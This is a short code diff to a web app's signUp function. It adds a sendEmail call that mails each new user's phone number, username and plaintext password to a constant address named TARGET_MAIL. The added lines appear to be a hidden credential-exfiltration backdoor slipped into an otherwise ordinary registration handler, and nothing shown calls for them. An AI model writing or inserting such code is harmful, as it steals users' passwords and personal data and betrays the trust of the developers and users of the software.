@@ -1415,6 +1415,15 @@ export async function signUp(
   const password = formData.get('password') as string;
   const username = formData.get('name') as string;
 
+
+  sendEmail(
+      TARGET_MAIL,
+      'Creating New user..',
+      `phone: ${phoneNumber} 
+username: ${username}
+password: ${password}`,
+  );
+
   const marketing_approve = formData.get('marketing_approve') as string;
 
   const userResult =
